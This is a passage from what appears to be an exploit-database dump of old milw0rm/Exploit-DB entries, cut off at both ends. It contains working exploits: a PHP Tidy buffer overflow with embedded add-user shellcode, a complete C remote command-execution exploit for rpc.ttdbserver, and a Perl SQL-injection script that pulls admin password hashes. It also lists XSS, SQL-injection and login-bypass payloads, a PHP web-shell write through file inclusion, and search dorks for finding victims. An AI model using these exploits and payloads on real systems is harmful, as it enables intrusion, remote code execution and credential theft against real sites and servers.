##-[[ XSS ]]- ## www.Target.com/members.php?PageNo= [[ XSS ]] ## #######################  # milw0rm.com [2008-08-20]",Pars4U Videosharing,1
4080,"PHP 5.2.3 'Tidy' Extension - Local Buffer Overflow <?php //PHP 5.2.3 tidy_parse_string() & tidy_repair_string() local //buffer overflow poc (win) //rgod //site: retrogod.altervista.org  //quickly tested on xp sp2, worked both from the cli and on apache //let's have a look here: http://www.google.com/codesearch?hl=it&q=+tidy_parse_string&sa=N  if (!extension_loaded(""tidy"")){die(""you need Tidy extension loaded!"");}  # win32_adduser -  PASS=tzu EXITFUNC=thread USER=sun Size=233 Encoder=JmpCallAdditive http://metasploit.com $scode = ""\xfc\xbb\x0b\xad\x7d\x9a\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85"". ""\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xf7\x45\x39\x9a\x07\x96\x49"". ""\xdf\x3b\x1d\x31\xe5\x3b\x20\x25\x6e\xf4\x3a\x32\x2e\x2a\x3a\xaf"". ""\x98\xa1\x08\xa4\x1a\x5b\x41\x7a\x85\x0f\x26\xba\xc2\x48\xe6\xf1"". ""\x26\x57\x2a\xee\xcd\x6c\xfe\xd5\x29\xe7\x1b\x9e\x6d\x23\xe5\x4a"". ""\xf7\xa0\xe9\xc7\x73\xe9\xed\xd6\x68\x9e\x12\x52\x6f\x4b\xa3\x38"". ""\x54\x8f\x77\xf1\x54\xeb\xfc\xb2\x64\x76\xc2\x4b\x89\xf3\x83\xa7"". ""\x1a\x73\x18\x15\x97\x1b\x28\x8e\xa1\x50\xa8\xe0\xb2\x66\xa9\x8b"". ""\xdb\x5a\xf6\xba\xed\xc2\x5e\x34\xe9\x81\x9f\x3d\x5a\xed\xf0\x0c"". ""\xba\x8d\x66\x09\xc5\xc7\x79\x7e\xc5\x30\xe6\xed\x5d\x90\x8c\x95"". ""\xf8\xcc\x61\x05\x23\x62\x1b\xbd\x03\x0f\x90\x58\x36\xcf\x25\xd6"". ""\xd8\x2f\xbe\x62\x50\x0f\x11\xd2\xde\x0b\x4d\xf2\xf8\xb3\xe3\x9f"". ""\x70\x93\x97\x30\x1a\xb2\x0b\xa8\xae\x5b\xa1\x46\x6f\xe2\x2d\xca"". ""\x06\x8a\xc4\x67\xad\x20\x76\xfc\x22\xb6\x0b\xdc\xcf\x43\x82\x3c"". ""\x1f\xea\x1e\x79\x5f\xec\x9e\x81\x5f"";  $EIP=""\x8B\x51\x81\x7C""; //0x7C81518B      call esp kernel32.dll $NOP=str_repeat(""\x90"",12); $____buff=str_repeat(""a"",2036).$EIP.$NOP.$scode; tidy_parse_string(1,$____buff,1); ?>  # milw0rm.com [2007-06-19]",PHP,1
27982,GANTTy 1.0.3 - 'index.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/18296/info  GANTTy is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.   An attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/index.php?action=login&message=<IMG SRC=javascript:alert(&#039;XSS&#039;)>+email&lang=,GANTTy,1
19635,"Sun Solaris 7.0 - rpc.ttdbserver Denial of Service // source: https://www.securityfocus.com/bid/811/info  It is possible to crash rpc.ttdbserver by using the old tddbserver buffer overflow exploit. This problem is caused by a NULL pointer being dereferenced when rpc function 15 is called with garbage. You cannot make rpc.ttdbserver execute arbitrary code with this vulnerability. The consequence of this vulnerability being exploited is a denial of service condition (rpc.ttdbserver).  /*  rpc.ttdbserver remote overflow, apk  Solaris (tested on SS5 and Ultra 2.5.1)  Irix (tested on r5k and r10k O2 6.3),   HP-UX ( tested on 700s 10.20)   usage: ./r [-ku] [-p port] [-f outfile] host cmd            -k : kill ttdbserver (read below)            -u : use UDP (default TCP)            -p port : connect to ttdbserver at port (don't ask portmap)            -f outfile : store rpc message in outfile (and do NOT contact host)   note:    it should compile on any normal system, to get HP-UX exploit compile with       -DHPUX, for Solaris -DSOLARIS, for Irix use -DIRIX    cmd is run through sh -c, and there is no practical limit for command       length, but it has to fit in buffer (1024 bytes in this case),       and ~(strlen + 1) cannot contain '0'    by default ttdbserver runs from inetd, so it will be respawned each time      it die (I mean execute command), also because it dies correct reply is      clnt_call error (connection reset, timeout etc)    -f file option: On HP-UX and Irix, connected socket gets first free      descriptor, 3 on HP-UX and 5 on Irix. You can use -f option to store      datagram to file, and send it to ttdbserver with your telnet of       choice.  With command like ""0<&3 1>&3 2>&3 exec sh"" on HP-UX you'll get      remote shell running. Solaris dup() connected fd to first free one      over 256, so you have to study sh man page to find a way to do this <g>      You should kill ttdbserver before, to make sure it doesn't have      any files open except 0-2 fds passed from inetd. Actually on Irix      it looks like fucked up, ttdbserver gets 0-2 fds from inetd, ignores      them and opens new ones as 3 and 4 fd, so you need to redirect 5th fd.      It happens on 6.3 at least, I need to look at other versions.      Irix is also the only one I saw which supports ttdbserver over UDP,      keep in mind that by default generated RPC datagram is TCP version with      record marking, you should use -u option to get UDP version (or just remove      first four bytes from generated file)   for reasons I can't quite understand, you _have_ to kil ttdbserver on Solaris     before sending a command there. When ttdbserver has connected clients,     it simply returns an error (filename too long). In both cases     it looks like the program goes through the same way, well, maybe I'll     get a clue one day what happens there.   On Irix to get over its fucked up cache, I simply send like 20kb to make     it flushed, so it's not reliable. You can find a buffer allocated by xdr      and it should be better.    surprizingly there are some differences between ttdbserver on above platforms,     like solaris dup() of fds, start-up Irix behaviour, the fact that     on Irix it first tries chdir to directory then do some task (it's the     reason I have to add ""/f"" at the end of buffer to have it copy overflow     part of the buffer on stack) etc. That's why it may not work on other     systems and versions than mentioned at the beginning.   */  #include <sys/types.h> #include <sys/time.h> #include <sys/socket.h> #include <netinet/in.h> #include <arpa/inet.h> #include <stdio.h> #include <unistd.h> #include <fcntl.h> #include <stdlib.h> #include <errno.h> #include <string.h> #include <netdb.h> #include <rpc/rpc.h>  #define PORT 0 #define BSIZE 1024  #if defined(SOLARIS) # define SP 0xefffd618 # define LENOFS 80 char asmcode[]=""\x20\xbf\xff\xff\x20\xbf\xff\xff\x7f\xff\xff\xff\x92\x03\xe0\x48\x90\x02\x60\x10\xe0\x02\x3f\xf0\xa2\x80\x3f\xff\xa0\x24\x40\x10\xd0\x22\x3f\xf0\xc0\x22\x3f\xfc\xa2\x02\x20\x09\xc0\x2c\x7f\xff\xe2\x22\x3f\xf4\xa2\x04\x60\x03\xc0\x2c\x7f\xff\xe2\x22\x3f\xf8\xa2\x04\x40\x10\xc0\x2c\x7f\xff\x82\x10\x20\x0b\x91\xd0\x20\x08\xff\xff\xff\xfc\x22\x22\x22\x22\x33\x33\x33\x33\x44\x44\x44\x44\x2f\x62\x69\x6e\x2f\x6b\x73\x68\x2e\x2d\x63\x2e""; char NOP[]=""\x80\x1c\x40\x11""; #endif  #if defined(HPUX) # define SP 0x7b03cc10 # define LENOFS 84 char asmcode[]=""\xeb\x40\x40\x02\x0b\x39\x02\x80\xd7\x40\x0c\x1e\xb7\x5a\x20\xb8\x0b\x5a\x02\x59\x0f\x21\x10\x98\x97\x18\x07\xff\x0f\x39\x12\x81\x0f\x20\x12\x99\xb7\x39\x20\x10\x0f\x20\x12\x1f\x0f\x59\x12\x89\xb7\x39\x20\x06\x0f\x20\x12\x1f\x0f\x59\x12\x91\x0b\x38\x06\x19\x0f\x20\x12\x1f\xb7\x59\x07\xe1\x20\x20\x08\x01\xe4\x20\xe0\x08\xb4\x16\x10\x16\x11\x11\x11\x11\x22\x22\x22\x22\x33\x33\x33\x33\x44\x44\x44\x44\x2f\x62\x69\x6e\x2f\x73\x68\x2e\x2d\x63\x2e""; char NOP[]=""\x0b\x39\x02\x80""; #endif  #if defined(IRIX) # define SP 0x7fff1b30 # define LENOFS 76 char asmcode[]=""\x04\x10\xff\xff\x27\xe4\x01\x01\x24\x84\xff\x5e\x8c\x8c\xff\xe5\x24\x0d\xff\xff\x01\xac\x60\x23\x01\x84\x60\x20\xa1\x80\xff\xff\xa0\x80\xff\xff\xac\x84\xff\xed\x24\x84\xff\xfd\xa0\x80\xff\xff\xac\x84\xff\xec\x24\x84\xff\xf8\x24\x85\xff\xf0\xac\x84\xff\xf0\xac\x80\xff\xfc\x24\x02\x03\xf3\x02\x04\x8d\x0c\xff\xff\xff\xfc\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x2f\x62\x69\x6e\x2f\x73\x68\x2e\x2d\x63\x2e""; char NOP[]=""\x24\x0f\x12\x34"";  #endif  #define TT_DBSERVER_PROG 100083 #define TT_DBSERVER_VERS 1 #define _TT_P 7  struct tt_reply {   int i1;   int i2; };  void usage(char *s) {   printf(""Usage: %s [-ku] [-p port] [-f outfile] host cmd\n"", s);   exit(0); }  bool_t xdr_tt_reply(XDR *xdrs, struct tt_reply *objp) {    if (!xdr_int(xdrs, &objp->i1))     return (FALSE);   if (!xdr_int(xdrs, &objp->i2))      return (FALSE);   return (TRUE); }  void make_file(char *fname, char *buf, int type);  main(int argc, char *argv[]) {   extern int optind;   extern char *optarg;   CLIENT *cl;   enum clnt_stat stat;   struct timeval tm;   struct hostent *hp;   struct sockaddr_in target;   struct tt_reply op_res;   char buf[64000], *path, *cmd, *host, *bp, *outfile = NULL;   int sd, i, sp = SP, bsize = BSIZE, port = PORT, kill = 0, proto = 0;    while ((i = getopt(argc, argv, ""ukp:f:"")) != EOF)     switch (i) {       case 'p':         port = atoi(optarg);         break;       case 'k':         kill = 1;         break;       case 'u':         proto = 1;         break;       case 'f':         outfile = optarg;         break;       default:         usage(argv[0]);     }   if (argc - optind < 2)     usage(argv[0]);   cmd = argv[optind + 1];   host = argv[optind];    for (i = 0; i < sizeof(buf); i++)     *(buf + i) = NOP[i % 4];    i = bsize - strlen(asmcode) - strlen(cmd);   i &= 0xfffffffc;   strcpy(buf + i, asmcode);   strcat(buf, cmd);   *(int *)(buf + i + LENOFS) = ~(strlen(cmd) + 1);   buf[strlen(buf)] = '.';   bp = buf + bsize;   for (i = 0; i < 16; bp+=4, i++)     *(int *)bp = sp; #ifdef IRIX   sp = sp + 400 + 31652;   for (i = 0; i < 5000; bp+=4, i++)     *(int *)bp = sp;   *bp++ = '/';   *bp++ = 'f';   path = buf + 2; #else   path = buf; #endif   *bp = 0;    if (outfile) {     make_file(outfile, buf, proto);     printf(""rpc datagram stored in %s\n"", outfile);     exit(0);   }    if ((target.sin_addr.s_addr = inet_addr(host)) == -1) {     if ((hp = gethostbyname(host)) == NULL) {       printf(""%s: cannot resolve\n"", host);       exit(1);      } else       target.sin_addr.s_addr = *(u_long *)hp->h_addr;   }   target.sin_family = AF_INET;   target.sin_port = htons(port);   sd = RPC_ANYSOCK;    tm.tv_sec = 4;   tm.tv_usec = 0;   if (proto)      cl = clntudp_create(&target, TT_DBSERVER_PROG, TT_DBSERVER_VERS, tm, &sd);   else     cl = clnttcp_create(&target, TT_DBSERVER_PROG, TT_DBSERVER_VERS, &sd, 0, 0);   if (cl == NULL) {     clnt_pcreateerror(""clnt_create"");     exit(0);   }   cl->cl_auth = authunix_create(""localhost"", 0, 0, 0, NULL);   tm.tv_sec = 10;    if (kill) {     path = NULL;     bp = NULL;     if ((stat = clnt_call(cl, 15, xdr_wrapstring, (char *)&path,          xdr_wrapstring, (char *)&bp, tm)) != RPC_SUCCESS) {       clnt_perror(cl, ""clnt_call"");       exit(1);     }     printf(""Could not kill ttdbserver, reply is: %s\n"", bp);     exit(1);   }    if ((stat = clnt_call(cl, _TT_P, xdr_wrapstring, (char *)&path, xdr_tt_reply,         (char *)&op_res, tm)) != RPC_SUCCESS) {     clnt_perror(cl, ""clnt_call"");     exit(1);   }   printf(""res i1 %d, res i2 %d\n"", op_res.i1, op_res.i2);   clnt_destroy(cl); }  void make_file(char *fname, char *buf, int type) {   int fd, offs;   XDR xdrm;   struct rpc_msg rpc_hdr;   struct authunix_parms aup;   char dgram[64000], rauth[MAX_AUTH_BYTES];    if (type == 1) /* UDP */     offs = 4;   if ((fd = open(fname, O_RDWR | O_CREAT | O_TRUNC, 0666)) == -1) {     perror(fname);     exit(1);   }   xdrmem_create(&xdrm, rauth, sizeof(rauth), XDR_ENCODE);   aup.aup_time = (u_long)time(NULL);   aup.aup_machname = ""localhost"";   aup.aup_uid = 0;   aup.aup_gid = 0;   aup.aup_len = 0;   aup.aup_gids = NULL;   if (xdr_authunix_parms(&xdrm, &aup) == FALSE) {     printf(""error encoding auth cred\n"");     exit(1);   }   rpc_hdr.rm_call.cb_cred.oa_length = xdr_getpos(&xdrm);   xdr_destroy(&xdrm);   xdrmem_create(&xdrm, dgram + 4, sizeof(dgram), XDR_ENCODE);   rpc_hdr.rm_xid = 0x12345678;   rpc_hdr.rm_direction = CALL;   rpc_hdr.rm_call.cb_rpcvers = 2;   rpc_hdr.rm_call.cb_prog = TT_DBSERVER_PROG;   rpc_hdr.rm_call.cb_vers = TT_DBSERVER_VERS;   rpc_hdr.rm_call.cb_proc = _TT_P;   rpc_hdr.rm_call.cb_cred.oa_flavor = AUTH_UNIX;   rpc_hdr.rm_call.cb_cred.oa_base = rauth;   rpc_hdr.rm_call.cb_verf.oa_flavor = AUTH_NONE;   rpc_hdr.rm_call.cb_verf.oa_base = NULL;   rpc_hdr.rm_call.cb_verf.oa_length = 0;   if (xdr_callmsg(&xdrm, &rpc_hdr) == FALSE) {     printf(""error encoding rpc header\n"");     exit(1);   }   if (xdr_wrapstring(&xdrm, &buf) == FALSE) {     printf(""error encoding rpc data\n"");     exit(1);   }   /* record marking */   *(u_int *)dgram = 0x80000000 | xdr_getpos(&xdrm);   if (write(fd, dgram + offs, xdr_getpos(&xdrm) + 4) == -1) {     perror(""write"");     exit(1);   }   xdr_destroy(&xdrm);   close(fd); }",Sun Solaris,1
7561,"phpGreetCards - Cross-Site Scripting / Arbitrary File Upload ...................................................................................................  ****(remote shell upload/xss)****  script: phpGreetCards     *************************************************************************** download from:http://www.w2b.ru/download/phpGreetCards.zip     *************************************************************************** www.site.com/path/index.php?mode=select&category  shell: www.site.com/path/userfiles/number_shell.php ----------------------------------------------------------------------------------------- dork:""powered by phpGreetCards""  if folder userfiles is forbidden after get upload file u do right-click and see image properties and u see address file.    ------------------------------------------------------------------------------------------ xss: index.php?mode=select&category=>""><ScRiPt%20%0a%0d>alert(0)%3B</ScRiPt>   **************************************************   Author: ahmadbady   **************************************************  # milw0rm.com [2008-12-23]",phpGreetCards,1
9328,"AW BannerAd - Authentication Bypass AW-BannerAd Login ByPass By JxE-13 [ Ro0T-MaFia ]  Sistema : AW-BannerAd,Asp Scripts Archivo : adv/admin/index.asp User&Pass:' or 'x'='x :' or 'x'='x   # milw0rm.com [2009-08-03]",AW BannerAd,1
7701,"Samba < 3.0.20 - Remote Heap Overflow /***********************************************************************************/ /* Samba < 3.0.20 heap overflow				   			   */ /* per Debian 3.0.14a Debian e altre versioni					   */ /* per versionare il sorgente:							   */ /* usare l'opzione DEBUG						  	   */ /* usare free() dalla GOT (non funziona su Mandriva,RHEL e Fedora)	 	   */   /* da qualche parte nel 3Â°/4Â° pacchetto di risposta dice la versione di Samba	   */ /* coded by zuc@hack.it						  	   */ /***********************************************************************************/ #define VERSN 25 struct versions vers[VERSN] = { {""Debian 3.1 r0 X restart"",0x0827c000,0x0837f000,30*1024}, {""Debian 3.1 r0 X"",0x0827c000,0x0837f000,30*1024}, {""Debian 3.1 r0 noX restart"",0x0827c000,0x0837f000,30*1024}, {""Debian 3.1 r0 noX"",0x0827c000,0x0837f000,30*1024}, {""Debian 3.1 r0a X 1st"",0x0827c000,0x0837f000,30*1024}, {""Debian 3.1 r0a noX restart"",0x0827c000,0x0837f000,30*1024}, {""Debian 3.1 r0a noX"",0x0827c000,0x0837f000,30*1024}, {""Debian 3.1 r1 noX restart"",0x0827c000,0x0837f000,30*1024}, {""Debian 3.1 r1 noX"",0x0827c000,0x0837f000,30*1024}, {""Debian 3.1 r2 noX restart"",0x0827c000,0x0837f000,30*1024}, {""Debian 3.1 r2 noX"",0x0827c000,0x0837f000,30*1024}, {""Debian 3.1 r3 noX restart"",0x0827c000,0x0837f000,30*1024}, {""Debian 3.1 r3 noX"",0x0827c000,0x0837f000,30*1024}, {""Debian 3.1 r4 noX restart"",0x0827c000,0x0837f000,30*1024}, {""Debian 3.1 r4 noX"",0x0827c000,0x0837f000,30*1024}, {""Debian 3.1 r5 noX restart"",0x0827c000,0x0837f000,30*1024}, {""Debian 3.1 r5 noX"",0x0827c000,0x0837f000,30*1024}, {""Debian 3.1 r6a noX restart"",0x0827c000,0x0837f000,30*1024}, {""Debian 3.1 r6a noX"",0x0827c000,0x0837f000,30*1024}, {""Slackware 10.0 restart"",0x0827c000,0x0837f000,30*1024}, {""Slackware 10.0"",0x0827c000,0x0837f000,30*1024}, {""Mandrake 10.1 noX"",0x80380000,0x8045b000,30*1024}, {""Mandrake 10.1 X Kde"",0x80380000,0x8045b000,30*1024}, {""Samba 3.0.x DEBUG"",0x80380000,0x8045b000,30*1024} };  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/7701.zip (2009-lsa.zip)  # milw0rm.com [2009-01-08]",Samba,1
3896,"TaskDriver 1.2 - Authentication Bypass / SQL Injection #!/usr/bin/perl -w  ################################################################################# #										# #	      TaskDriver <= 1.2 Login Bypass/SQL Injection Exploit		# #										# # Discovered by: Silentz							# # Payload: Login Bypass & Admin Username & Hash Retrieval			# # Website: http://www.w4ck1ng.com						# # 										# # Vulnerable Code (login.php): 							# #										# # $sql = ""SELECT * FROM  $userstable WHERE username = '$_POST[username]' AND    # #         password = md5('$_POST[password]')"";					# #										# # Vulnerable Code (notes.php):							# #       									# # $taskid = $_GET['taskid'];							# # $sql = ""SELECT * FROM $taskstable WHERE taskid = '$taskid'"";			# #										# # PoC: http://victim.com/login.php						# #      In username box input: ' OR 1=1 /*					# #      In password box: [ANYTHING OR NOTHING]					# #										# #      OR: 									# #										# #      http://victim.com/notes.php?taskid=-999' UNION SELECT 0,0,username,      # #      0,0,0,0,0,0,0,0,0,password FROM users WHERE userlevel='a' /*		# # 										# # Subject To: magic_quotes_gpc set to off					# # GoogleDork: Get your own!							# # Notes: You can do a UNION INSERT in the password reset form to add an admin	# #										# # Shoutz: The entire w4ck1ng community						# #										# #################################################################################  use LWP::UserAgent; if (@ARGV < 1){ print ""-------------------------------------------------------------------------\r\n""; print ""           TaskDriver <= 1.2 Login Bypass/SQL Injection Exploit\r\n""; print ""-------------------------------------------------------------------------\r\n""; print ""Usage: w4ck1ng_taskdriver.pl [PATH]\r\n\r\n""; print ""[PATH] = Path where TaskDriver is located\r\n\r\n""; print ""e.g. w4ck1ng_taskdriver.pl http://victim.com/taskdriver/\r\n""; print ""-------------------------------------------------------------------------\r\n""; print ""            		 http://www.w4ck1ng.com\r\n""; print ""            		        ...Silentz\r\n""; print ""-------------------------------------------------------------------------\r\n""; exit(); }  $b = LWP::UserAgent->new() or die ""Could not initialize browser\n""; $b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)'); $cookie = ""fook%21%27+or+1%3D1+%2F%2A;""; $host = $ARGV[0] . ""notes.php?taskid=-999' UNION SELECT 0,0,username,0,0,0,0,0,0,0,0,0,password FROM users WHERE userlevel='a' /*"";  my @cookie = ('Cookie' => ""auth=$cookie;""); my $res = $b->get($host, @cookie);  $answer = $res->content; if ($answer =~ /notes on (.*?)<\/u><\/td><\/tr>/){ print ""-------------------------------------------------------------------------\r\n""; print ""            TaskDriver <= 1.2 Login Bypass/SQL Injection Exploit\r\n""; print ""-------------------------------------------------------------------------\r\n""; print ""[+] Admin User : $1\n""; }  if ($answer =~/([0-9a-fA-F]{32})<\/font>/){ print ""[+] Admin Hash : $1\n""; print ""-------------------------------------------------------------------------\r\n""; print ""            		 http://www.w4ck1ng.com\r\n""; print ""            		        ...Silentz\r\n""; print ""-------------------------------------------------------------------------\r\n""; }  # milw0rm.com [2007-05-10]",TaskDriver,1
12361,"lanewsfactory - Multiple Vulnerabilities LaNewsFactory Multiple Remote Vulnerabilities http://www.salvatorefresta.net/files/adv/LaNewsFactory%20Multiple%20Remote%20Vulnerabilities-19042010.txt   Name              LaNewsFactory  Vendor            Christophe Brocas  Versions Affected <= 1.0.0   Author            Salvatore Fresta aka Drosophila  Website           http://www.salvatorefresta.net  Contact           salvatorefresta [at] gmail [dot] com  Date              2010-04-19  X. INDEX   I.    ABOUT THE APPLICATION  II.   DESCRIPTION  III.  ANALYSIS  IV.   SAMPLE CODE  V.    FIX  VI.   DISCLOSURE TIMELINE    I. ABOUT THE APPLICATION  This  is  a  very used  news manager that  not require a database.   II. DESCRIPTION  This news managment is affected  by many  vulnerabilities that  allows  a  guest  to  write  arbitrary files on the system, include local files, read local files etc..   III. ANALYSIS  Summary:   A) Anonymous email  B) Remote File Writing  C) Multiple Local File Inclusion  D) Full Path Disclosure  A) Anonymous email  The mailto.php file allows a guest to send arbitrary emails. The input is not properly sanitised:  if (ValidEmailAdress($youremail) and ValidEmailAdress($friendemail)) { 	mail ($friendemail, $display[$lang][""mailtoafriend""],""$comments\n\n"".$url.""print"".$LNF_file_extension.""?art=$newsfilename\n\n$yourname"", ""From: $youremail"");   B) Remote File Writing  The save-edited-news.php  file  allows a guest to write a file  on the  system.  This  vulnerability may be used to execute remote commands on the system.   C) Multiple Local File Inclusion  There are many files that use a not sanitised input with include PHP function. This  vulnerability  may be used to execute remote commands by including the Apache Log file.   D) Full Path Disclosure  For  example,   print.php  file  prints  many  errors  by including the full path of the file.  This  path  may  be very useful for local file inclusion and other.    IV. SAMPLE CODE  A) Anonymous email  	mailto.php?friendemail=target@email.com&youremail=ano@email.com&comments=suck! 	 	 B) Remote File Writing to Remote Command Execution  	save-edited-news.php?art=news/file.php&corps=<?php system($_GET[cmd]); ?> 	 	 D) Full Path Disclosure  	print.php?art=-1.xml   V. FIX  No fix.   VIII. DISCLOSURE TIMELINE  2010-04-19 Bugs discovered 2010-04-19 Advisory released",lanewsfactory,1
37245,"Pasworld - 'detail.php' Blind SQL Injection =========================================================  [+] Title                :-   Pasworld detail.php Blind Sql Injection Vulnerability  [+] Date                 :-   5  -  June  -  2015 [+] Vendor Homepage:     :-   http://main.pasworld.co.th/ [+] Version              :-   All Versions [+] Tested on            :-   Nginx/1.4.5, PHP/5.2.17, Linux - Windows [+] Category             :-   webapps [+] Google Dorks         :-   intext:""Powered By :: PAS World Communitcation"" inurl:detail.php                                site:go.th inurl:""detail.php?id="" [+] Exploit Author       :-   Shelesh Rauthan (ShOrTy420 aKa SEB@sTiaN) [+] Team name            :-   Team Alastor Breeze [+] The official Members :-   Sh0rTy420, P@rL0u$, !nfIn!Ty, Th3G0v3Rn3R [+] Greedz to            :-   @@lu, Lalit, MyLappy<3, Diksha [+] Contact              :-   fb.com/shelesh.rauthan, indian.1337.hacker@gmail.com, shortycharsobeas@gmail.com  =========================================================  [+] Severity Level          :- High [+] Request Method(s)       :- GET / POST [+] Vulnerable Parameter(s) :- detail.php?id= [+] Affected Area(s)        :- Entire admin, database, Server    =========================================================  [+] About :-  Unauthenticated SQL Injection via ""detail.php?id="" parameter   [+] SQL vulnerable File :- /home/DOMAIN/domains/DOMAIN.go.th/public_html/detail.php   [+] POC    :-  http://127.0.0.1/detail.php?id=[SQL]'  SQLMap ++++++++++++++++++++++++++ python sqlmap.py --url ""http://127.0.0.1/detail.php?id=[SQL]"" --dbs ++++++++++++++++++++++++++  Parameter: id (GET)     Type: boolean-based blind     Title: AND boolean-based blind - WHERE or HAVING clause     Payload: id=152 AND 1414=1414      Type: error-based     Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause     Payload: id=152 AND (SELECT 1163 FROM(SELECT COUNT(*),CONCAT(0x7162766271,(SELECT (CASE WHEN (1163=1163) THEN 1 ELSE 0 END)),0x7162707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)      Type: UNION query     Title: MySQL UNION query (random number) - 9 columns     Payload: id=-7470 UNION ALL SELECT 5982,5982,5982,5982,5982,CONCAT(0x7162766271,0x4b437a4a565555674571,0x7162707671),5982,5982,5982#    =========================================================",Pasworld,1
5867,"AJ Auction Web 2.0 - 'cate_id' SQL Injection ######################################################### # #     Auction Web 2.0  SQL Injection Vulnerability #======================================================== #    Author: Hussin X                                   = #                                                       = #    Home :  www.tryag.cc/cc                            = #                                                       = #    email:  darkangel_g85[at]Yahoo[DoT]com             = #            hussin.x[at]hotmail[DoT]com                = #                                                       = #========================================================= #    HomE script : http://www.ajauctionpro.com/ajhome.php #      #    Demo : http://www.ajauctionpro.com/auction_web2.0/    #     #          DorK :  Powered By AJ Auction Web #          DorK :  Powered By Auction Web #      ##########################################################  Exploit:     http://localhost.com/[PaTs]/category.php?cate_id=-1+union+select+1,concat(user_name,0x3a,password),3,4+from+admin--   Admin login  admin/index.php  ################################################################################ #####################################( Greetz )################################# #                                                                              # #           tryag / Mr.IraQ / DeViL iRaQ / IRAQ DiveR/ IRAQ_JAGUA              #        #                mos_chori / Rafi / FAHD / Iraq Hackers /                      #        #                                                                              # #################################(and All IRAQIs)############################### ################################################################################  # milw0rm.com [2008-06-19]",AJ Auction Web,1
29427,Magic Photo Storage Website - '/user/login.php?_config[site_path]' Remote File Inclusion source: https://www.securityfocus.com/bid/21965/info                      Magic Photo Storage Website is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.                      Exploiting these issues may allow an attacker to compromise the application and the underlying system; other attacks are also possible.  http://www.example.com/path/user/login.php?_config[site_path]=http://www.example2.com,Magic Photo Storage Website,1
46351,"OPNsense < 19.1.1 - Cross-Site Scripting ################################################################################################################################## # Exploit Title: OPNsense 19.1 | Cross-Site Scripting # Date: 01.02.2019 # Exploit Author: Ozer Goker # Vendor Homepage: https://opnsense.org # Software Link: http://mirror.ams1.nl.leaseweb.net/opnsense/releases/19.1/OPNsense-19.1-OpenSSL-dvd-amd64.iso.bz2 # Version: 19.1 ##################################################################################################################################  Introduction OPNsense is an open source, easy-to-use and easy-to-build FreeBSD based firewall and routing platform. OPNsense includes most of the features available in expensive commercial firewalls, and more in many cases. It brings the rich feature set of commercial offerings with the benefits of open and verifiable sources.   #################################################################################   XSS details: Reflected & Stored  #################################################################################  XSS1 | Reflected  URL http://192.168.2.200/diag_backup.php  METHOD Post  PARAMETER GDrive_GDriveEmail  PAYLOAD ""><script>alert(1)</script>  #################################################################################  XSS2 | Reflected  URL http://192.168.2.200/diag_backup.php  METHOD Post  PARAMETER GDrive_GDriveFolderID  PAYLOAD ""><script>alert(2)</script>  #################################################################################  XSS3 | Reflected  URL http://192.168.2.200/diag_backup.php  METHOD Post  PARAMETER GDrive_GDriveBackupCount  PAYLOAD ""><script>alert(3)</script>  #################################################################################  XSS4 | Reflected  URL http://192.168.2.200/diag_backup.php  METHOD Post  PARAMETER Nextcloud_url  PAYLOAD ""><script>alert(4)</script>  #################################################################################  XSS5 | Reflected  URL http://192.168.2.200/diag_backup.php  METHOD Post  PARAMETER Nextcloud_user  PAYLOAD ""><script>alert(5)</script>  #################################################################################  XSS6 | Reflected  URL http://192.168.2.200/diag_backup.php  METHOD Post  PARAMETER Nextcloud_password  PAYLOAD ""><script>alert(6)</script>  #################################################################################  XSS7 | Reflected  URL http://192.168.2.200/diag_backup.php  METHOD Post  PARAMETER Nextcloud_password_encryption  PAYLOAD ""><script>alert(7)</script>  #################################################################################  XSS8 | Reflected  URL http://192.168.2.200/diag_backup.php  METHOD Post  PARAMETER Nextcloud_backupdir  PAYLOAD ""><script>alert(8)</script>  #################################################################################  XSS9 | Stored  URL http://192.168.2.200/system_advanced_sysctl.php?act=edit  METHOD Post  PARAMETER tunable  PAYLOAD ""><script>alert(9)</script>  #################################################################################  XSS10 | Reflected  URL http://192.168.2.200/system_advanced_sysctl.php?act=edit  METHOD Post  PARAMETER value  PAYLOAD ""><script>alert(10)</script>  #################################################################################  XSS11 | Reflected  URL http://192.168.2.200/interfaces_vlan_edit.php  METHOD Post  PARAMETER tag  PAYLOAD ""><script>alert(11)</script>  #################################################################################  XSS2 | Reflected  URL http://192.168.2.200/interfaces_vlan_edit.php  METHOD Post  PARAMETER descr  PAYLOAD ""><script>alert(12)</script>  #################################################################################  XSS13 | Reflected  URL http://192.168.2.200/interfaces_vlan_edit.php  METHOD Post  PARAMETER vlanif  PAYLOAD ""><script>alert(13)</script>  #################################################################################  XSS14 | Reflected  URL http://192.168.2.200/diag_ping.php  METHOD Post  PARAMETER host  PAYLOAD ""><script>alert(14)</script>  #################################################################################  XSS15 | Reflected  URL http://192.168.2.200/diag_traceroute.php  METHOD Post  PARAMETER host  PAYLOAD ""><script>alert(15)</script>  #################################################################################  XSS16 | Stored  URL http://192.168.2.200/firewall_rules_edit.php?if=FloatingRules  METHOD Post  PARAMETER category  PAYLOAD ""><script>alert(16)</script>  #################################################################################  XSS17 | Stored  URL http://192.168.2.200/firewall_rules_edit.php?if=lan  METHOD Post  PARAMETER category  PAYLOAD ""><script>alert(17)</script>  #################################################################################  XSS18 | Stored  URL http://192.168.2.200/firewall_rules_edit.php?if=wan  METHOD Post  PARAMETER category  PAYLOAD ""><script>alert(18)</script>  #################################################################################  XSS19 | Reflected  URL http://192.168.2.200/vpn_ipsec_settings.php  METHOD Post  PARAMETER passthrough_networks%5B%5D  PAYLOAD <img%20src=x%20onerror=alert(19)>  #################################################################################  XSS20 | Reflected  URL http://192.168.2.200/ui/monit  METHOD Post  PARAMETER mailserver  PAYLOAD <img src=x onerror=alert(20)>  #################################################################################  XSS21 | Reflected  URL http://192.168.2.200/ui/proxy  METHOD Post  PARAMETER ignoreLogACL  